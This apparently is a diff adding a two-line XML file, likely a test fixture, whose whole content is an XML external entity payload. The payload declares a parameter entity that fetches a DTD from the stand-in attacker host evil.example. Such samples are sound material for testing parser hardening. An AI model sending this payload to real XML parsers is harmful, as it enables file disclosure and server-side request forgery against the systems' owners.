@@ -1,0 +1,2 @@
+<!DOCTYPE foo [ <!ENTITY % remote SYSTEM "http://evil.example/x.dtd"> %remote; ]>
+<foo/>
